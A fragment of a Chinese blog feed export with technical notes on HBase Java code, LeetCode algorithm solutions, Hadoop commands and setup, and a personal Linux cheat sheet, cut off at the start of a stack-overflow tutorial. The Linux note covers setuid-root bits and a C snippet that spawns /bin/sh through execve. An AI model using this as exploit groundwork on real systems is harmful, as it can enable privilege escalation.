<h2 id="删表"><a href="#删表" class="headerlink" title="删表"></a>删表</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void deleteTable(String tableName) throws IOException &#123;</span><br><span class="line">    init();</span><br><span class="line">    TableName tn = TableName.valueOf(tableName);</span><br><span class="line">    if (admin.tableExists(tn)) &#123;</span><br><span class="line">        admin.disableTable(tn);</span><br><span class="line">        admin.deleteTable(tn);</span><br><span class="line">    &#125;</span><br><span class="line">    close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="查看所有表信息"><a href="#查看所有表信息" class="headerlink" title="查看所有表信息"></a>查看所有表信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void listTables() throws IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        HTableDescriptor hTableDescriptors[] = admin.listTables();</span><br><span class="line">        for(HTableDescriptor hTableDescriptor :hTableDescriptors)&#123;</span><br><span class="line">            System.out.println(hTableDescriptor.getNameAsString());</span><br><span class="line">        &#125;</span><br><span class="line">        close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://www.cnblogs.com/heibaiying/p/11404883.html" target="_blank" rel="noopener">https://www.cnblogs.com/heibaiying/p/11404883.html</a><br>[2] <a href="http://dblab.xmu.edu.cn/post/bigdatapractice/#xiazaizhuanqu" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/post/bigdatapractice/#xiazaizhuanqu</a></p>
]]></content>
      <categories>
        <category>bigdata</category>
      </categories>
      <tags>
        <tag>hbase</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode</title>
    <url>/2019/11/21/leetcode/</url>
    <content><![CDATA[<p>leetcode做题笔记</p>
<a id="more"></a>
<h1 id="91题"><a href="#91题" class="headerlink" title="91题"></a>91题</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>一条包含字母<code>A-Z</code>的消息通过以下方式进行了编码，给定一个只包含数字的非空字符串，请计算解码方法的总数。<br>‘A’ -&gt; 1  ‘B’ -&gt; 2   …  ‘Z’ -&gt; 26<br><a href="https://leetcode-cn.com/problems/decode-ways/" target="_blank" rel="noopener">题目</a></p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>初看可以通过暴力破解，但是超时。改用动态规划<br>设<code>dp[i]={字符串下标i结尾的解码方法数}</code>。<br>如果不加限制，可以得到<code>dp[i]=dp[i-1]+dp[i-2]</code><br>此题目有限制：0不能解码，00不能解码，01不能解码。当i,i+1组合的数字不在[1,26]，就不用计算dp[i-2]。<br>因此在求解dp[i]的时候需要分情况讨论：需要查看dp[i-1]的值。</p>
<blockquote>
<p>注意：以下的加上dp[i-2]的时候都要讨论是否成立(两位字符组成的数字是否在[1.26])</p>
<ul>
<li><code>dp[i-1]==0 &amp;&amp; dp[i] == 0</code>  return 0。</li>
<li><code>dp[i-1]==0 &amp;&amp; dp[i] != 0</code>  这种情况因为前一位是0，两位数字无法解码，dp[i]=dp[i-1]。</li>
<li><code>dp[i-1]!=0 &amp;&amp; dp[i] == 0</code>  0不能解码。dp[i]=condition{dp[i-2]}</li>
<li><code>dp[i-1]!=0 &amp;&amp; dp[i] != 0</code>  dp[i]=dp[i-1]+condition{dp[i-2]}</li>
</ul>
</blockquote>
<h1 id="93复原IP地址"><a href="#93复原IP地址" class="headerlink" title="93复原IP地址"></a>93复原IP地址</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>给定一个只包含数字的字符串，复原它并返回所有可能的 IP 地址格式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;25525511135&quot;</span><br><span class="line">输出: [&quot;255.255.11.135&quot;, &quot;255.255.111.35&quot;]</span><br></pre></td></tr></table></figure>

<p><a href="https://leetcode.com/submissions/detail/280818977/" target="_blank" rel="noopener">题目</a></p>
<h2 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h2><p>可以使用暴力法来求解。<br>这里我使用回溯求解问题。主要是在这些字符串里面放置三个点，并且每一个点的最多有三位数字<br>先分割第一串，如2()，25()，255()。括号里面的是在下次递归用到的。<br><code>dfs(vector&lt;string&gt; &amp;re, string temp, string s, int start, int dot)</code><br>每次在得到一个数字的时候需要判断是否合法，如果不合法，就在这回溯。不合法的时候是不能切割出数字，有前导0，不在0-255这个范围。当dot==0的时候，是到叶子节点了，此时判断切割的数字是否合法。</p>
<h1 id="95不同的二叉搜索树II"><a href="#95不同的二叉搜索树II" class="headerlink" title="95不同的二叉搜索树II"></a>95不同的二叉搜索树II</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数 n，生成所有由 1 … n 为节点所组成的二叉搜索树<br><a href="https://leetcode.com/problems/unique-binary-search-trees-ii/" target="_blank" rel="noopener">题目</a></p>
<h2 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h2><p>可以使用递归来求解，定义<code>vector&lt;TreeNode*&gt; dfs(int start, int end)</code>求解所有的数字从[start,end]组成的二叉搜索树。<br>分别将[1,n]中的一个节点<code>i</code>当作根节点，那么求得所有的左子树为<code>dfs(start, i-1)</code>，求得所有的右子树为<code>dfs(i+1, end)</code>。最后将两个集合分别添加到<code>i</code>的左右子树中。<br>这里有一个边界情况，当<code>start&gt;end</code>的时候子树是一个空树，需要返回。</p>
<h1 id="96-不同的二叉搜索树"><a href="#96-不同的二叉搜索树" class="headerlink" title="96 不同的二叉搜索树"></a>96 不同的二叉搜索树</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数 n，求以 1 … n 为节点组成的二叉搜索树有多少种？<br><a href="https://leetcode.com/problems/unique-binary-search-trees/" target="_blank" rel="noopener">题目</a></p>
<h2 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h2><p>这里可以使用递归的方法求解，如95题一样。但是可以使用动态规划如下。<br><code>dp[i]</code>表示i个节点能够组成的不同二叉搜索树的数目，可以得到dp[0]=1(空树)，dp[1]=1(单个节点的树)。<br>求解n个节点的时候，可以将[1,n]不同的树分别依次当作跟节点。对于每一个情形下的跟节点，能够组成二叉搜索树的数目等于<code>左子树的个数×右子树的个数</code>。<br>所以有如下推断：</p>
<blockquote>
<p>1为跟节点：左子树只有0个节点，右子树有n-1个节点<br>2为跟节点：左子树只有1个节点，右子树有n-2个节点<br>………<br>n为跟节点：左子树只有n-1个节点，右子树有0个节点</p>
</blockquote>
<p>得到状态方程：<code>dp[n]=dp[0]*dp[n-1]+dp[1]*dp[n-2]+....+dp[n-1]*dp[0]</code></p>
<h1 id="97交错字符串"><a href="#97交错字符串" class="headerlink" title="97交错字符串"></a>97交错字符串</h1><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p>给定字符串s1，s2，s3，判定s3是否由s1与s2交错组成的。</p>
<blockquote>
<p>Input: s1 = “aabcc”, s2 = “dbbca”, s3 = “aadbbcbcac”<br>Output: true</p>
</blockquote>
<p><a href="https://leetcode.com/problems/interleaving-string/" target="_blank" rel="noopener">题目</a></p>
<h2 id="解法-4"><a href="#解法-4" class="headerlink" title="解法"></a>解法</h2><p>动态规划解法。<br>设<code>dp[i][j]=1</code>表示字符串s1的前i个字符与s2的前j个字符能够交错组成s3的前i+j个字符，下标从1开始。<br>一个例子如下<br>s1:aabcc, 长度为5<br>s2:dbbca， 长度为5<br>s3:aadbbcbcac。长度为10<br>可以看到s1的最后一个字符与s3最后一个字符相等，只需要判断s1.substr(0,4)，s2，s3.substr(0,9)能否组成交错字符串就行了。<br>因此可以得到如下的状态转移方程<br><code>dp[i][j]={ if(s1[i]==s3[i+j]) dp[i-1][j] ||  if(s2[j]==s3[i+j]) dp[i][j+1] }</code><br>为了方便求解，需要定义空字符串。i=0表示s1是空，只看s2就行了。最后的dp表大致结构(仅仅是举例)如下。<strong>计算过程首先要计算dp[i][0]和dp[0][i]。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  * 1 2 3 4 </span><br><span class="line">* T F</span><br><span class="line">1 T</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<h1 id="98验证二叉搜索树"><a href="#98验证二叉搜索树" class="headerlink" title="98验证二叉搜索树"></a>98验证二叉搜索树</h1><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，判断其是否是一个有效的二叉搜索树。二叉搜索树的特征如下：<br>节点的左子树只包含小于当前节点的数。<br>节点的右子树只包含大于当前节点的数。<br>所有左子树和右子树自身必须也是二叉搜索树。<br><a href="https://leetcode.com/problems/validate-binary-search-tree/" target="_blank" rel="noopener">题目</a></p>
<h2 id="解法-5"><a href="#解法-5" class="headerlink" title="解法"></a>解法</h2><p>可以使用递归解法，对于当前的节点，先判断它的左节点是否小于它本身，右节点是否大于该节点的值，但是这里却不能保障右节点的子树中出现比该节点小的值，如下的一棵树。<br><img src="/images/leetcode/01.png" alt="pic1"><br>可以保障每一个节点符合二叉搜索树要求(左节点小于根节点&amp;&amp;右节点大于根节点)。但是6小于10。不符合要求。所以我们在递归的时候需要传递一个最大值，最小值判断当前的根节点是否符号要求。特别需要注意int数据的范围。<br><code>bool helper(TreeNode* root, long long min, long long max)</code><br>对此，需要传递参数min和max，判定当前节点是否符合区间要求，如果不符合，就返回false。如果当前节点符合区间要求，就分别递归左右子树，同时传递新的区间给下面。<br>区间传递原则：对于一个节点的左子树，它的值最大是该节点本身所以有<br><code>leftB=helper(root-&gt;left, min, root-&gt;val)</code>，对于右子树，它的所有节点最小值是该节点本身，所以有<code>rightB=helper(root-&gt;right, root-&gt;val, max)</code>。</p>
<h1 id="76最小覆盖子串"><a href="#76最小覆盖子串" class="headerlink" title="76最小覆盖子串"></a>76最小覆盖子串</h1><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><p>给你一个字符串 S、一个字符串 T，请在字符串 S 里面找出：包含 T 所有字母的最小子串。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: S = &quot;ADOBECODEBANC&quot;, T = &quot;ABC&quot;</span><br><span class="line">Output: &quot;BANC&quot;</span><br></pre></td></tr></table></figure>

<p><a href="https://leetcode.com/problems/minimum-window-substring/" target="_blank" rel="noopener">题目</a></p>
<h2 id="解法-6"><a href="#解法-6" class="headerlink" title="解法"></a>解法</h2><p>1) 思路：这里使用滑动窗口求解。思路是这样的，先扩大再收缩，如所给例子中，left，right分别代表窗口的两端。<br><img src="/images/leetcode/02.png" alt="pic2"><br>第一次扩大窗口，直到窗口里面包含有字符串T，此时为[0,5]。然后进行收缩，从左边开始，结束的条件是窗口中不包含字符串T的字母，此时为[1,5]。<br>第二次向右开始扩大窗口，知道再次包含T，此时为[1,10]。然后进行收缩，left移动，直到窗口中不在包含T，此时为[6,10]。<br>第三次右扩，此时为[6,12]，包含右T。然后收缩，变为[10,12]。<br>无法右扩，结束。<br>2) 需要解决的问题：如何判断字符串S中包含T：用<code>Map&lt;char, int&gt;</code>来存储T，表示T中的每一个字符的个数。<code>cnt</code>表示窗口中包含的字符种类数，右扩的时候，遍历S的时候，遇到字符ch，如果ch再map中存在，map[ch]减一，如果等于0了，表示该字符已经得到(cnt++)，<code>cnt==map_size()</code>说明已经包含T了。左收缩的时候，遇到S中的字符时，就map[ch]–，如果等于1，说明该S中刚好没有包含T。<br>3) 滑动窗口求解框架</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">初始化窗口</span><br><span class="line">//开始滑动窗口</span><br><span class="line">while (left &lt;= right &amp;&amp; left &lt; s.length()-1 &amp;&amp; right &lt; s.length()-1) &#123;</span><br><span class="line">	//右窗口扩展</span><br><span class="line">	while (cnt &lt; lens &amp;&amp; right &lt; s.length()) &#123;</span><br><span class="line">		right++;</span><br><span class="line">		进行有关判断条件</span><br><span class="line">	&#125;</span><br><span class="line">	//左窗口收缩</span><br><span class="line">	while (cnt == lens &amp;&amp; left &lt; s.length()) &#123;</span><br><span class="line">		if(无法收缩了)&#123;</span><br><span class="line">		   记录当前值</span><br><span class="line">		&#125;</span><br><span class="line">		left++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="239-滑动窗口最大值"><a href="#239-滑动窗口最大值" class="headerlink" title="239 滑动窗口最大值"></a>239 滑动窗口最大值</h1><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><p>给定一个数组nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧，你只可以看到在滑动窗口内的 k 个数字。滑动窗口每次只向右移动一位。返回滑动窗口中的最大值。<br><a href="https://leetcode.com/problems/sliding-window-maximum/" target="_blank" rel="noopener">题目</a></p>
<h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>这个题目的关键是找到每个窗口的最大值，一个有效的办法是用一个类似于二叉搜索树这样的数据结构，方便插入和删除，同时也能保持数值有序，STL模板中的<code>multiset</code>提供这样一个功能，内部使用红黑树实现，每一次插入和删除保持数据有序，最大值可以通过<code>*mulset.rbegin()</code>获得。因此可以用这个数据结构模拟窗口滑动过程即可。需要注意的是<code>erase(val)</code>是删除所有符合val的值，因此需要使用迭代器来删除数据。</p>
<h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>使用一个双端队列来完成，队列deque的队首保存当前窗口中的最大值，re中保存结果。队列需要保存的是数组的索引。测试用例是<code>nums = [1,3,-1,-3,5,3,6,7]</code>，和<code>k = 3</code>，具体操作见如下：<br>第一步，遍历到第一个值的时候，进入双端队列deque。队首元素是当前最大值（保存索引）<br><img src="/images/leetcode/03_1.png" alt="pic"></p>
<p>第二步：遍历到第二个值，3大于当前队首的值，所以当前窗口最大值不是双端队列的元素，因此队首元素出栈，将3从队首插入。<br><img src="/images/leetcode/03_2.png" alt="pic"></p>
<p>第三步：遍历到第三个值，-1比队首值小，但是它有可能成为接下来窗口的最大值，因此从队尾插入。此时达到了窗口大小，将队首元素插入到结果集中。<br><img src="/images/leetcode/03_3.png" alt="pic"></p>
<p>第四步：继续遍历，窗口发生移动，检查队首元素下标还在当前窗口，-3有可能成为最大值，从队尾插入。窗口移动过程中产生一个最大值，即队首元素保存到结果集中<br><img src="/images/leetcode/03_4.png" alt="pic"></p>
<p>第五步: 继续遍历，移动窗口，当前元素为5，但是双端队列中一些元素不在当前窗口，因此将清理无效数据，队首元素从队首出队。又当前元素为5，与队首比较，大于-1，队首-1出栈，继续比较直到队首元素大于5或者为空。<br><img src="/images/leetcode/03_5.png" alt="pic"><br>该算法框架如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int[] maxSlidingWindow(int[] a, int k) &#123;		</span><br><span class="line">		if (a == null || k &lt;= 0) &#123;</span><br><span class="line">			return new int[0];</span><br><span class="line">		&#125;</span><br><span class="line">		int n = a.length;</span><br><span class="line">		int[] r = new int[n-k+1];</span><br><span class="line">		int ri = 0;</span><br><span class="line">		// store index</span><br><span class="line">		Deque&lt;Integer&gt; q = new ArrayDeque&lt;&gt;();</span><br><span class="line">		for (int i = 0; i &lt; a.length; i++) &#123;</span><br><span class="line">			// remove numbers out of range k</span><br><span class="line">			while (!q.isEmpty() &amp;&amp; q.peek() &lt; i - k + 1) &#123;</span><br><span class="line">				q.poll();</span><br><span class="line">			&#125;</span><br><span class="line">			// remove smaller numbers in k range as they are useless</span><br><span class="line">			while (!q.isEmpty() &amp;&amp; a[q.peekLast()] &lt; a[i]) &#123;</span><br><span class="line">				q.pollLast();</span><br><span class="line">			&#125;</span><br><span class="line">			// q contains index... r contains content</span><br><span class="line">			q.offer(i);</span><br><span class="line">			if (i &gt;= k - 1) &#123;</span><br><span class="line">				r[ri++] = a[q.peek()];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return r;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>hadoop01--basic</title>
    <url>/2019/11/14/hadoop01-basic/</url>
    <content><![CDATA[<p>hadoop2.7.1入门之基本命令</p>
<a id="more"></a>
<p>hadoop安装<br>Hadoop基本命令<br>idea环境下的开发</p>
<h1 id="0x00安装"><a href="#0x00安装" class="headerlink" title="0x00安装"></a>0x00安装</h1><p>环境:</p>
<blockquote>
<p>hadoop:2.7.2<br>java:1.8.0_181<br>maven:3.6.1<br>IDEA:2018.03</p>
</blockquote>
<p>安装过程将给出的文档。<br><a href="https://hadoop.apache.org/docs/r2.7.2/hadoop-project-dist/hadoop-common/SingleCluster.html#Pseudo-Distributed_Operation" target="_blank" rel="noopener">https://hadoop.apache.org/docs/r2.7.2/hadoop-project-dist/hadoop-common/SingleCluster.html#Pseudo-Distributed_Operation</a></p>
<p><a href="http://dblab.xmu.edu.cn/blog/install-hadoop/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/install-hadoop/</a>  <br><br>安装完成后可以通过web界面查看<code>http://106.14.124.205:50070</code></p>
<h1 id="0x01基本命令"><a href="#0x01基本命令" class="headerlink" title="0x01基本命令"></a>0x01基本命令</h1><h2 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop fs -mkdir -p /class4</span><br></pre></td></tr></table></figure>

<p><a href="https://hadoop.apache.org/docs/r2.7.2/hadoop-project-dist/hadoop-common/FileSystemShell.html#mkdir" target="_blank" rel="noopener">hadoop fs 官方命令</a></p>
<h2 id="查看列表"><a href="#查看列表" class="headerlink" title="查看列表"></a>查看列表</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop fs -ls [-d] [-h] [-R] &lt;args&gt;</span><br><span class="line">eg: hadoop fs -ls /</span><br></pre></td></tr></table></figure>

<p><a href="https://hadoop.apache.org/docs/r2.7.2/hadoop-project-dist/hadoop-common/FileSystemShell.html#ls" target="_blank" rel="noopener">hadoop ls 官方命令</a></p>
<h2 id="本地上传文件至hdfs系统"><a href="#本地上传文件至hdfs系统" class="headerlink" title="本地上传文件至hdfs系统"></a>本地上传文件至hdfs系统</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage: hadoop fs -copyFromLocal &lt;localsrc&gt; URI</span><br><span class="line">hadoop fs -copyFromLocal hdfs2local.txt  /class4/hdfs2local.txt</span><br></pre></td></tr></table></figure>

<p>还有另外一个命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage: hadoop fs -put &lt;localsrc&gt; ... &lt;dst&gt;</span><br><span class="line">hadoop fs -put test.txt /class4</span><br></pre></td></tr></table></figure>

<h2 id="hdfs系统下载文件到本地文件系统"><a href="#hdfs系统下载文件到本地文件系统" class="headerlink" title="hdfs系统下载文件到本地文件系统"></a>hdfs系统下载文件到本地文件系统</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop fs -get /class4/test.txt /opt/download</span><br></pre></td></tr></table></figure>

<h2 id="hdfs系统内部文件的复制"><a href="#hdfs系统内部文件的复制" class="headerlink" title="hdfs系统内部文件的复制"></a>hdfs系统内部文件的复制</h2><p>从一个目录复制到另外一个目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop fs -cp /class4/test.txt /input1</span><br></pre></td></tr></table></figure>

<h2 id="hdfs删除文件或者目录"><a href="#hdfs删除文件或者目录" class="headerlink" title="hdfs删除文件或者目录"></a>hdfs删除文件或者目录</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage: hadoop fs -rm [-f] [-r |-R] [-skipTrash] URI [URI ...]</span><br><span class="line">The -f option will not display a diagnostic message or modify the exit status to reflect an error if the file does not exist.</span><br><span class="line">The -R option deletes the directory and any content under it recursively.</span><br><span class="line">The -r option is equivalent to -R.</span><br></pre></td></tr></table></figure>

<p>一个示例：<code>hadoop fs -rm  /user/hadoop/emptydir</code></p>
<h1 id="0x02-idea开发环境配置"><a href="#0x02-idea开发环境配置" class="headerlink" title="0x02 idea开发环境配置"></a>0x02 idea开发环境配置</h1><p><strong>建议使用mavaen3.6.1</strong>，不然会报错。<br>一个测试例子如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        String fileName = &quot;/class4/test.txt&quot;;</span><br><span class="line">        Configuration conf = new Configuration();</span><br><span class="line">        conf.set(&quot;fs.defaultFS&quot;, &quot;hdfs://localhost:9000&quot;);</span><br><span class="line">        conf.set(&quot;fs.hdfs.impl&quot;, &quot;org.apache.hadoop.hdfs.DistributedFileSystem&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            FileSystem fs = FileSystem.get(conf);</span><br><span class="line">            if(fs.exists(new Path(fileName)))&#123;</span><br><span class="line">                System.out.println(&quot;文件存在&quot;);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                System.out.println(&quot;文件不存在&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="普通的java项目开发"><a href="#普通的java项目开发" class="headerlink" title="普通的java项目开发"></a>普通的java项目开发</h2><blockquote>
<p>这里的开发环境是本地win10，hadoop集群在linux系统上。<br>ctrl+alt +t生成try-catch代码</p>
<ul>
<li>step1: 新建java工程，导入jar包(根据需要选择)。</li>
<li>step2: 建立java源文件，进行代码编写。</li>
<li>step3: 将项目导出jar包，具体步骤见参考文献[2]。不要选择empty.</li>
<li>step4: 将jar包上传至linux系统上。</li>
<li>step5: 运行命令执行jar包</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop jar hadoopEnvTest.jar</span><br><span class="line">hadoop jar hadoopEnvTest.jar isExist</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>:使用这种jar包运行方式的时候，需要在命令后面指定主类方法，不然出现错误<code>RunJar jarFile [mainClass] args...</code></p>
<blockquote>
<p>build -&gt; build artifacts -&gt; rebuilds 重新生成jar包。<br>Tool -&gt; deployment -&gt; configuration -&gt; stfp配置<br>右击jar -&gt; deployment -&gt; unload..</p>
</blockquote>
<h2 id="使用maven开发"><a href="#使用maven开发" class="headerlink" title="使用maven开发"></a>使用maven开发</h2><ul>
<li>step1: 新建maven工程。</li>
<li>step2: 修改pom文件，见附录1</li>
<li>step3: 导出jar包，参考文献[2]</li>
<li>step4: jar包上传至linux系统。</li>
<li>step5: 运行jar包，同普通项目一样。</li>
</ul>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="附录1"><a href="#附录1" class="headerlink" title="附录1"></a>附录1</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;groupId&gt;com.yijun.hadoopMaven&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;hadoopEnvMav&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">        &lt;hadoop.version&gt;2.7.1&lt;/hadoop.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.12&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.8.2&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;hadoop-client&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;hadoop.version&#125;&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;hadoop-common&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;hadoop.version&#125;&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;hadoop-hdfs&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;hadoop.version&#125;&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<p>然后在<code>src/main/resources</code>目录下，新建一个文件，命名为<code>log4j.properties</code>，文件中填入如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">log4j.rootLogger=INFO, stdout</span><br><span class="line">log4j.appender.stdout=org.apache.log4j.ConsoleAppender</span><br><span class="line">log4j.appender.stdout.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern=%d %p [%c] - %m%n</span><br><span class="line">log4j.appender.logfile=org.apache.log4j.FileAppender</span><br><span class="line">log4j.appender.logfile.File=target/spring.log</span><br><span class="line">log4j.appender.logfile.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.logfile.layout.ConversionPattern=%d %p [%c] - %m%n</span><br></pre></td></tr></table></figure>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://www.shiyanlou.com/courses/237/learning/?id=1032" target="_blank" rel="noopener">https://www.shiyanlou.com/courses/237/learning/?id=1032</a><br>[2] <a href="https://blog.csdn.net/ouyang111222/article/details/73105086" target="_blank" rel="noopener">https://blog.csdn.net/ouyang111222/article/details/73105086</a></p>
]]></content>
      <categories>
        <category>bigdata</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>linuxcmd</title>
    <url>/2019/11/14/linuxcmd/</url>
    <content><![CDATA[<p>本人常用的linux命令收藏</p>
<a id="more"></a>
<h1 id="0x00工具类"><a href="#0x00工具类" class="headerlink" title="0x00工具类"></a>0x00工具类</h1><h2 id="查看二进制文件od"><a href="#查看二进制文件od" class="headerlink" title="查看二进制文件od"></a>查看二进制文件<code>od</code></h2><p>不加任何参数是以八进制形式输出二进制</p>
<h3 id="十六进制查看"><a href="#十六进制查看" class="headerlink" title="十六进制查看"></a>十六进制查看</h3><p>加上x是以十六进制输出，小端形式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">od -x text</span><br><span class="line">od -w1 -x text #每列只输出一个</span><br></pre></td></tr></table></figure>

<h2 id="查看执行程序的所有者"><a href="#查看执行程序的所有者" class="headerlink" title="查看执行程序的所有者"></a>查看执行程序的所有者</h2><p><code>whoami</code><br>可以查看运行程序是哪一个所属组权限，即查看euid。</p>
<h1 id="0x01权限类"><a href="#0x01权限类" class="headerlink" title="0x01权限类"></a>0x01权限类</h1><h2 id="root权限的setuid"><a href="#root权限的setuid" class="headerlink" title="root权限的setuid"></a>root权限的setuid</h2><p>setuid是系统的一个标志位，可执行性文件设置setuid位后，操作系统会赋予文件所有者的权限。<br>设置方法<code>chmod u+s fileName</code>或者<code>chmod 4755 fileName</code></p>
<h1 id="0x02系统调用"><a href="#0x02系统调用" class="headerlink" title="0x02系统调用"></a>0x02系统调用</h1><h2 id="execve函数"><a href="#execve函数" class="headerlink" title="execve函数"></a>execve函数</h2><p>函数原型：<code>int execve(const char *pathname, char *const argv[], char *const envp[]);</code><br>头文件：<code>#include &lt;unistd.h&gt;</code><br>用法：</p>
<blockquote>
<p>filename：程序所在的路径<br>argv：传递给程序的参数，数组指针argv必须以程序(filename)开头，NULL结尾<br>envp：传递给程序的新环境变量，无论是shell脚本，还是可执行文件都可以使用此环境变量，必须以NULL结尾</p>
</blockquote>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char *data[2];</span><br><span class="line">char sh[]= &quot;/bin/sh&quot;;</span><br><span class="line">data[0] =sh;</span><br><span class="line">data[1] = NULL;</span><br><span class="line">execve(sh, data, NULL);</span><br></pre></td></tr></table></figure>

<h1 id="0x03实用脚本"><a href="#0x03实用脚本" class="headerlink" title="0x03实用脚本"></a>0x03实用脚本</h1><h2 id="循环移动文件"><a href="#循环移动文件" class="headerlink" title="循环移动文件"></a>循环移动文件</h2><p><code>for i in *.src; do mv $i src/$i; done</code><br>移动所有.src结尾的文件到src目录下面</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>gcc</tag>
      </tags>
  </entry>
  <entry>
    <title>stack-overflow-eg</title>
    <url>/2019/11/04/stack-overflow-eg/</url>
    <content><![CDATA[<p>栈溢出基础入门实例<br>这是一个简单的栈溢出实例，来自i春秋。</p>
<a id="more"></a>
